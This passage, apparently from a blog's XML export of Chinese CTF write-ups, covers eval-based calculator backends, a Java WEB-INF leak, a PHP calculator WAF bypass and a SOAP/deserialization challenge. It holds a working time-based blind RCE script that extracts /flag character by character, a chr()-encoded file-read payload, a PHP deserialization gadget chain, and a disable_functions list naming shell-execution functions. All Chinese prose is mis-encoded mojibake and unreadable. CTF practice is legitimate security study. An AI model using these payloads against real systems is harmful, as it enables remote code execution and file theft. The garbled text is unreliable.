__builtins__.<span class="keyword">exec</span></span><br><span class="line">    <span class="keyword">return</span> bson.BSON.encode(&#123;</span><br><span class="line">        <span class="string">"ret"</span>: str(eval(str(expr[<span class="string">'expression'</span>])))</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(<span class="string">"0.0.0.0"</span>, <span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line">$input = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$options = MongoDB\BSON\toPHP($input);</span><br><span class="line">$ret = <span class="keyword">eval</span>(<span class="string">'return '</span> . (string) $options-&gt;expression . <span class="string">';'</span>);</span><br><span class="line"><span class="keyword">echo</span> MongoDB\BSON\fromPHP([<span class="string">'ret'</span> =&gt; (string) $ret]);</span><br></pre></td></tr></table></figure>

<p>WAF</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">disable_functions = set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log</span><br><span class="line">max_execution_time = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>nodejs</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> bson = <span class="built_in">require</span>(<span class="string">'bson'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line"><span class="keyword">const</span> cluster = <span class="built_in">require</span>(<span class="string">'cluster'</span>)</span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cluster.isMaster) &#123;</span><br><span class="line">  app.use(bodyParser.raw(&#123; <span class="attr">inflate</span>: <span class="literal">true</span>, <span class="attr">limit</span>: <span class="string">'10kb'</span>, <span class="attr">type</span>: <span class="string">'*/*'</span> &#125;))</span><br><span class="line"></span><br><span class="line">  app.post(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> body = req.body</span><br><span class="line">    <span class="keyword">const</span> data = bson.deserialize(Buffer.from(body))</span><br><span class="line">    <span class="keyword">const</span> worker = cluster.fork()</span><br><span class="line">    worker.send(data.expression.toString())</span><br><span class="line">    worker.on(<span class="string">'message'</span>, (ret) =&gt; &#123;</span><br><span class="line">      res.write(bson.serialize(&#123; <span class="attr">ret</span>: ret.toString() &#125;))</span><br><span class="line">      res.end()</span><br><span class="line">    &#125;)</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!worker.isDead()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          worker.kill()</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!res._headerSent) &#123;</span><br><span class="line">        res.write(bson.serialize(&#123; <span class="attr">ret</span>: <span class="string">'timeout'</span> &#125;))</span><br><span class="line">        res.end()</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  app.listen(<span class="number">80</span>, () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Server created'</span>)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">  (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> Module = <span class="built_in">require</span>(<span class="string">'module'</span>)</span><br><span class="line">    <span class="keyword">const</span> _require = Module.prototype.require</span><br><span class="line">    Module.prototype.require = <span class="function">(<span class="params">arg</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> ([<span class="string">'os'</span>, <span class="string">'child_process'</span>, <span class="string">'vm'</span>, <span class="string">'cluster'</span>].includes(arg)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> _require.call(_require, arg)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)()</span><br><span class="line"></span><br><span class="line">  process.on(<span class="string">'message'</span>, msg =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> ret = <span class="built_in">eval</span>(msg)</span><br><span class="line">    process.send(ret)</span><br><span class="line">    process.exit(<span class="number">0</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸‰ä¸ªåç«¯åŒæ—¶å¯¹è¾“å…¥å¾—å¼å­è¿›è¡Œè®¡ç®—ï¼Œå¦‚æœç»“æœç›¸ç­‰å°±è¾“å‡ºç”Ÿæ•ˆ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">validate(value: any, <span class="attr">args</span>: ValidationArguments) &#123;</span><br><span class="line">    <span class="keyword">const</span> str = value ? value.toString() : <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span> (str.length === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!(args.object <span class="keyword">as</span> CalculateModel).isVip) &#123;</span><br><span class="line">        <span class="keyword">if</span> (str.length &gt;= args.constraints[<span class="number">0</span>]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/^[0-9a-z\[\]\(\)\+\-\*\/ \t]+$/i</span>.test(str)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹è¾“å…¥çš„æ­£åˆ™åŒ¹é…è¿‡æ»¤</p>
<p>æ¯ä¸€ä¸ªåç«¯éƒ½æ˜¯ç›´æ¥è¿›è¡Œevalï¼Œå¹¶æ²¡æœ‰é¢„æ‰§è¡Œï¼Œæˆ–è€…æ”¾åœ¨sandboxä¸­æ‰§è¡Œï¼Œé‚£å¦‚æœæˆ‘ä»¬çš„æ¶æ„å‚æ•°è¾“å…¥ï¼Œç¡®å®æ˜¯å…ˆæ‰§è¡Œåï¼Œæ‰æ¯”å¯¹ç»“æœï¼Œçœ‹ä¸åˆ°å›æ˜¾ï¼Œæ•°æ®å¤–å¸¦ä¸è¡Œï¼Œå› ä¸ºä¸‰ä¸ªåç«¯éƒ½åœ¨å†…ç½‘ä¸­</p>
<p>ä¸‹é¢çš„ä¸œè¥¿éƒ½åœ¨è¿™ç¯‡æ–‡ç« é‡Œ<a href="https://skysec.top/2017/12/29/Time-Based-RCE/" target="_blank" rel="noopener">https://skysec.top/2017/12/29/Time-Based-RCE/</a></p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__import__(&#39;time&#39;).sleep(5) if &#123;boolean_exp&#125; else 1</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">'http://f32915b5-e4b2-469f-b8b6-b16e707888b6.node3.buuoj.cn/calculate'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(payload)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'eval(%s)'</span> % (<span class="string">'+'</span>.join(<span class="string">'chr(%d)'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> payload))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(bool_expr)</span>:</span></span><br><span class="line">    payload = <span class="string">"__import__('time').sleep(5) if %s else 1"</span> % bool_expr</span><br><span class="line">    t = time()</span><br><span class="line">    r = requests.post(url, json=&#123;<span class="string">'isVip'</span>: <span class="literal">True</span>, <span class="string">'expression'</span>: encode(payload)&#125;)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    delta = time() - t</span><br><span class="line">    print(payload, delta)</span><br><span class="line">    <span class="keyword">return</span> delta &gt; <span class="number">5</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span><span class="params">(geq_expression, l, r)</span>:</span>    <span class="comment">#äºŒåˆ†æ³•~</span></span><br><span class="line">    eq_expression = geq_expression.replace(<span class="string">'&gt;='</span>, <span class="string">'=='</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> (r - l) &lt; <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">for</span> mid <span class="keyword">in</span> range(l, r + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> query(eq_expression.format(num=mid)):</span><br><span class="line">                    <span class="keyword">return</span> mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'NOT FOUND'</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        mid = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> query(geq_expression.format(num=mid)):</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line"><span class="comment"># flag_len = binary_search("len(open('/flag').read())&gt;=&#123;num&#125;", 0, 100)</span></span><br><span class="line">flag_len = <span class="number">36</span></span><br><span class="line">print(<span class="string">'flag length: %d'</span> % flag_len)</span><br><span class="line">flag = <span class="string">'flag&#123;170f0d57-6cdd-405a-b1aa-9da5b742d6b1&#125;'</span></span><br><span class="line"><span class="keyword">while</span> len(flag) &lt; <span class="number">50</span>:</span><br><span class="line">    c = binary_search(<span class="string">"ord(open('/flag').read()[%d])&gt;=&#123;num&#125;"</span> % len(flag), <span class="number">0</span>, <span class="number">128</span>)</span><br><span class="line">    <span class="keyword">if</span> c:   <span class="comment"># the bs may fail due to network issues</span></span><br><span class="line">        flag += chr(c)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>RoarCTF</title>
    <url>/2020/02/19/RoarCTF/</url>
    <content><![CDATA[<h4 id="1-Easy-Java"><a href="#1-Easy-Java" class="headerlink" title="1.Easy Java"></a>1.Easy Java<a id="more"></a></h4><p>æ‰“å¼€é¢˜ç›®å‡ºç°çš„æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢</p>
<img src="/2020/02/19/RoarCTF/java.png" class="">

<p>ç‚¹å‡»helpå‡ºç°äº†æç¤º:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br></pre></td></tr></table></figure>

<p>ç”¨burpæŠ“åŒ…,ä½†æ˜¯æ€ä¹ˆæ”¹éƒ½æ— æ³•ä¸‹è½½æˆ–è€…æ‰“å¼€help.docxï¼Œåé¢å°è¯•æŠŠGETæ”¹æˆäº†POSTï¼ŒæˆåŠŸæ‰“å¼€äº†è¿™ä¸ªæ–‡ä»¶</p>
<p>ç”±äºé¢˜ç›®æ˜¯è·Ÿjavaæœ‰å…³ç³»ï¼Œå°±å»ç™¾åº¦äº†ï¼Œæ‰¾åˆ°äº†ä¸€ç¯‡å¾ˆè¯¦ç»†çš„æ–‡ç« ï¼Œè¿™é‡Œæ˜¯é‡ç‚¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WEB-INF&#x2F;web.xmlæ³„éœ²</span><br><span class="line">WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚</span><br><span class="line">&#x2F;WEB-INF&#x2F;web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­ </span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p>å°è¯•WEB-INF/web.xmlæ‰¾åˆ°äº†ç–‘ä¼¼flagæ–‡ä»¶çš„ä¸œè¥¿â€¦</p>
<img src="/2020/02/19/RoarCTF/java1.png" class="">

<p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªcom.wm.ctf.FlagController</p>
<p>æ„é€ payload:<code>WEB-INF/classes/com/wm.ctf.FlagController.class</code></p>
<img src="/2020/02/19/RoarCTF/java2.png" class="">

<p>å¯ä»¥çœ‹åˆ°ä¸€ä¸²base64ç¼–ç çš„å­—ç¬¦,è§£ç å³å¯å¾—åˆ°flag.</p>
<h4 id="2-Easy-Calc"><a href="#2-Easy-Calc" class="headerlink" title="2.Easy Calc"></a>2.Easy Calc</h4><p>æ˜¯ä¸€é“è®¡ç®—å™¨çš„é¢˜ï¼Œç›´æ¥çœ‹ç½‘é¡µæºç æ‰¾åˆ°äº†ä¸€ä¸ªå«calc.phpçš„æ–‡ä»¶ï¼Œå¯ä»¥è®¿é—®</p>
<img src="/2020/02/19/RoarCTF/calc.png" class="">

<p>å¯ä»¥çœ‹å‡ºpayloadä¸­ä¸èƒ½åŒ…å«â€™ â€˜, â€˜\tâ€™, â€˜\râ€™, â€˜\nâ€™,â€™â€™â€™, â€˜â€œâ€˜, â€˜`â€™, â€˜[â€˜, â€˜]â€™ ç­‰å­—ç¬¦,è€Œä¸”å‰é¢æœ‰æç¤ºè¯´åŠ ä¸Šäº†WAF,è¿™é“é¢˜æˆ‘ä»¬å¯ä»¥ç”¨%20æ¥è¿›è¡Œç»•è¿‡WAF</p>


<p>æ¥ä¸‹æ¥çš„å†…å®¹æ˜¯åˆšåˆšä»ä¸€ç¯‡åšå®¢å­¦åˆ°çš„æ–°çŸ¥è¯†ï¼Œåœ¨è¿™ä¹‹å‰å¹¶ä¸çŸ¥é“(æˆ‘å¤ªèœäº†â€¦)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">phpçš„æ–‡ä»¶æ“ä½œå‡½æ•°ï¼š</span><br><span class="line">getcwd â€” å–å¾—å½“å‰å·¥ä½œç›®å½•</span><br><span class="line">dirname(string $path) â€” è¿”å› path çš„çˆ¶ç›®å½•</span><br><span class="line">scandir â€” åˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½•</span><br></pre></td></tr></table></figure>

<p>æœ‰äº†ä¸Šé¢çš„è¿™äº›æ“ä½œå‡½æ•°,é‚£ä¹ˆå°±çœ‹å¯ä»¥æ‰¾flagäº†â€¦</p>
<p>ä¸€å±‚å±‚å¾€ä¸Šæ‰¾</p>
<img src="/2020/02/19/RoarCTF/java3.png" class="">

<p>åœ¨è¿™é‡Œæ‰¾åˆ°äº†f1aggçš„æ–‡ä»¶,ä½†æ˜¯/æ˜¯è¢«è¿‡æ»¤çš„,è¿™é‡Œä¸èƒ½ç›´æ¥ç”¨<code>var_dump(file_get_contents(&#39;/f1agg&#39;));</code></p>
<p>æƒ³åˆ°äº†ç”¨asciiç æ¥è¿›è¡Œç»•è¿‡,ç”¨â€™.â€™æ¥è¿›è¡Œæ‹¼æ¥</p>
<p>payloadï¼š<code>var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))ï¼›</code></p>
<p>é¡ºåˆ©æ‹¿åˆ°flag</p>
]]></content>
      <tags>
        <tag>something import</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPU2019web6</title>
    <url>/2020/07/14/SWPU2019web6/</url>
    <content><![CDATA[<p>ç¬¬ä¸€æ­¥ç™»å½•æ¡†å¤„çš„è€ƒç‚¹æ—©ä¸Šæ‰é‡åˆ°è¿‡<a id="more"></a></p>
<p>è¿™é‡Œè¿˜æ˜¯è¦ç”¨åˆ°with rollup,ä¹‹å‰çš„ç†è§£æœ‰ç‚¹é”™è¯¯ï¼Œæœ¬åœ°æµ‹è¯•äº†ä¸€ä¸‹æ˜ç™½äº†ï¼Œä¸‹é¢æ˜¯æµ‹è¯•çš„æ•°æ®</p>
<img src="/2020/07/14/SWPU2019web6/1.png" class="">

<p>æ„é€ æŸ¥è¯¢è¯­å¥çš„è¿”å›ç»“æœ</p>
<img src="/2020/07/14/SWPU2019web6/2.png" class="">

<p>å¯ä»¥çœ‹åˆ°æœ‰è¿”å›ä¸€åˆ—passwordä¸ºNULLçš„æ•°æ®ï¼Œå…¶ä»–çš„éƒ½è·ŸåŸå§‹æ•°æ®ä¸€æ ·</p>
<p>ç”¨è¿™ä¸ªæ–¹æ³•å¯ä»¥ç»•è¿‡ç™»å½•æˆåŠŸ</p>
<img src="/2020/07/14/SWPU2019web6/3.png" class="">

<p>ç™»å½•ä¹‹åï¼Œæ‰«æç›®å½•ï¼Œå‘ç°wsdl.phpï¼Œè®¿é—®</p>
<img src="/2020/07/14/SWPU2019web6/4.png" class="">

<p>è¿™é‡Œæœ‰mythodèƒ½å¤Ÿä¼ çš„å€¼ï¼ŒFile_readæç¤ºè¦ä¼ å…¥ä»€ä¹ˆï¼Œåº”è¯¥æ˜¯filenameï¼Œå…ˆæ¥çœ‹çœ‹hinté‡Œæœ‰ä»€ä¹ˆ</p>
<img src="/2020/07/14/SWPU2019web6/5.png" class="">

<p>å¯ä»¥çœ‹åˆ°ç»™äº†ä¸€äº›æ–‡ä»¶åï¼Œåˆ°è¿™é‡Œå°±å¯ä»¥æƒ³åˆ°ç”¨File_readæ¥è¯»å–æºç äº†ï¼Œé™¤äº†Service.phpæ— æƒé™è®¿é—®ï¼Œå…¶ä»–çš„éƒ½å¯ä»¥æ‰’ä¸‹æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">include</span> (<span class="string">"encode.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"Service.php"</span>);</span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//phpinfo();</span></span><br><span class="line"></span><br><span class="line">$method = $_GET[<span class="string">'method'</span>]?$_GET[<span class="string">'method'</span>]:<span class="string">'index'</span>;</span><br><span class="line"><span class="comment">//echo 1231;</span></span><br><span class="line">$allow_method = <span class="keyword">array</span>(<span class="string">"File_read"</span>,<span class="string">"login"</span>,<span class="string">"index"</span>,<span class="string">"hint"</span>,<span class="string">"user"</span>,<span class="string">"get_flag"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!in_array($method,$allow_method))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"not allow method"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($method===<span class="string">"File_read"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $param =$_POST[<span class="string">'filename'</span>];</span><br><span class="line">    $param2=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>($method===<span class="string">"login"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $param=$_POST[<span class="string">'username'</span>];</span><br><span class="line">        $param2 = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"method can use"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $method;</span><br><span class="line">$newclass = <span class="keyword">new</span> Service();</span><br><span class="line"><span class="keyword">echo</span> $newclass-&gt;$method($param,$param2);</span><br><span class="line"></span><br><span class="line">ob_flush();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span>.<span class="title">php</span></span></span><br><span class="line"><span class="class"> &lt;?<span class="title">php</span>   </span></span><br><span class="line">    include('Service.php');</span><br><span class="line">    $ser = <span class="keyword">new</span> SoapServer(<span class="string">'Service.wsdl'</span>,<span class="keyword">array</span>(<span class="string">'soap_version'</span>=&gt;SOAP_1_2));</span><br><span class="line">    $ser-&gt;setClass(<span class="string">'Service'</span>);</span><br><span class="line">    $ser-&gt;handle();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">se.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">                &#123;</span><br><span class="line">                    $s1 = <span class="keyword">$this</span>-&gt;&#123;$name&#125;;</span><br><span class="line">                    $s1();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($ke)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;mod2[$ke];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> $mod3;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod2 = <span class="keyword">$this</span>-&gt;mod3.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">public</span> $flag;</span><br><span class="line">        <span class="keyword">public</span> $b;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                session_start(); </span><br><span class="line">                var_dump($_SESSION);</span><br><span class="line">                $a = <span class="keyword">array</span>(reset($_SESSION),<span class="keyword">$this</span>-&gt;flag);</span><br><span class="line">                <span class="keyword">echo</span> call_user_func(<span class="keyword">$this</span>-&gt;b,$a);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> $str2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;str1-&gt;&#123;<span class="keyword">$this</span>-&gt;str2&#125;();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_POST[<span class="string">'aa'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„encode.phpéœ€è¦è¯»å–ï¼Œåé¢çš„è§£å¯†è¿˜è¦ç”¨åˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encode.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">en_crypt</span><span class="params">($content,$key)</span></span>&#123;</span><br><span class="line">    $key    =    md5($key);</span><br><span class="line">    $h      =    <span class="number">0</span>;</span><br><span class="line">    $length    =    strlen($content);</span><br><span class="line">    $swpuctf      =    strlen($key);</span><br><span class="line">    $varch   =    <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($h == $swpuctf)</span><br><span class="line">        &#123;</span><br><span class="line">            $h = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $varch .= $key&#123;$h&#125;;     </span><br><span class="line">        $h++;</span><br><span class="line">    &#125;</span><br><span class="line">    $swpu  =  <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $swpu .= chr(ord($content&#123;$j&#125;) + (ord($varch&#123;$j&#125;)) % <span class="number">256</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($swpu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨æºç é‡Œæœ‰ä¸€ä¸ªkeyaaaaaaaasdfsaf.txtæç¤ºï¼Œè¯»å–æ–‡ä»¶æ˜¯ä¸ªå‡çš„flagï¼Œåº”è¯¥æ˜¯è§£å¯†ç”¨çš„å¯†é’¥äº†ï¼šflag{this_is_false_flag}</p>
